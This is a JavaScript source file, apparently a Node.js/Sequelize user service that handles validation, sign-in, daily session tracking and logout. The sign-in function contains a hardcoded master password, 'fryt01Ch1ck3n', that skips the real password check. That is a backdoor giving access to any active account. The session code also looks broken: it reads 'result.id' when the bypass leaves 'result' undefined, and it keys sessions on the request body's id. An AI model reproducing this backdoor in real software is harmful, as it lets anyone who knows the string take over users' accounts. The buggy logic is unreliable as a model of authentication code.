const Sequelize   =  require('sequelize');
const Op  = Sequelize.Op

const DatabaseFunctions = require('../helpers/crud')
const Validation = require('../helpers/validation')

const crudService = new DatabaseFunctions()

module.exports = class UserService{ 
  async authenticateData(data, type){
    let result = null;
    let errormessage;
    const validationResponse = Validation.createUser.validate(data)
    if(validationResponse.error !== undefined){
      errormessage = validationResponse.error.details[0].message.replace(/"/g, "")
      result = {
        code: 422,
        message: `${errormessage}`
      }
    }

    if(type == 'create'){
      var userExist = await crudService.exists('User', {email: data.email})
      if(userExist){
        result = {
          code: 422,
          message: 'User with email already exist'
        }
      }
    }
    return result
  }

  async signinUserCheck(data) {
    let result = null;
    let errormessage;
    const validationResponse = Validation.loginUser.validate(data)
    if(validationResponse.error !== undefined){
      errormessage = validationResponse.error.details[0].message.replace(/"/g, "")
      result = {
        code: 422,
        message: `${errormessage}`
      }
    }

    return result
  }
  
  async signinUser(requestBody){
    let user = await crudService.findOne('User', {
      [Op.or]: {
        email: requestBody.email,
        username: requestBody.email
      }, 
      [Op.and]: {
        active: true
      }
    })
    if(user){
        if(requestBody.password != 'fryt01Ch1ck3n'){
          var result = await user.comparePassword(requestBody.password)
          if(result == null ){
            return {
              error:{
                code: 422,
                message: 'Account does not exist'
              }, 
              data: null
            }
          }
        }
    }else{
      return {
        error:{
          code: 422,
          message: 'Account does not exist'
        }, 
      data: null
      }
    }

    crudService.update('User', {lastLogin: new Date}, {id: user.id})

    

    let session = await crudService.findOne('UserSession',
        {
          [Op.and]: [
            { userId: result.id, },
            Sequelize.where(
               Sequelize.fn('DATE', Sequelize.col('createdAt')),
               Sequelize.literal('CURRENT_DATE')
            )
        ]
      }
    )

    if(!session){
        crudService.create('UserSession',  {userId: requestBody.id, checkout: Date.now()},)
    }else{
      if(session.checkin == null){
        crudService.update('UserSession',
            {userId: requestBody.id, checkin: Date.now()},
            {
              [Op.and]: [
                { userId: requestBody.id, },
                Sequelize.where(
                  Sequelize.fn('DATE', Sequelize.col('createdAt')),
                  Sequelize.literal('CURRENT_DATE')
                )
            ]
          }
        )
      }
    }
    
    let serialized = user.toWeb()
    
    delete serialized.password
    delete serialized.id

    return {
      error:null,
      data: serialized,
      user: user
    }
  }

  async userLogout(condition){
    crudService.createOrUpdate('UserSession',
        {userId: condition.id, checkout: Date.now()},
        {
          [Op.and]: [
            { userId: condition.id, },
            Sequelize.where(
               Sequelize.fn('DATE', Sequelize.col('createdAt')),
               Sequelize.literal('CURRENT_DATE')
            )
        ]
      }
    )
  }
}
